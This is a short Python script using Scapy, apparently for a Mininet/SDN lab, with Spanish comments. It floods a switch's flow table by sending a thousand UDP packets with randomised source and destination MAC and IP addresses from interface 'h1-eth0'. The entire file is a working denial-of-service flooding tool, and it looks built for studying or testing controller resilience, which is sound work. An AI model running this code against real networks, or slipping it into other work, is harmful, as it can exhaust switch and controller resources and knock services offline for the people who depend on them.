from scapy.all import sendp, Ether, IP, UDP
import random
import time

def random_mac():
    return "00:00:00:%02x:%02x:%02x" % (random.randint(0x00, 0x7f), random.randint(0x00, 0xff), random.randint(0x00, 0xff))

def random_ip():
    return "10.0.%d.%d" % (random.randint(1, 254), random.randint(1, 254))

def flood_flow_table():
    for i in range(1000):  # Reducido para pruebas iniciales
        pkt = Ether(src=random_mac(), dst=random_mac()) / \
              IP(src=random_ip(), dst=random_ip()) / \
              UDP(sport=random.randint(1024, 65535), dport=80)
        sendp(pkt, iface="h1-eth0", verbose=False)
        print(f"Paquete {i+1} enviado: {pkt.summary()}")
        time.sleep(0.01)  # Pausa corta para ver el tráfico en controlador

if __name__ == "__main__":
    flood_flow_table()
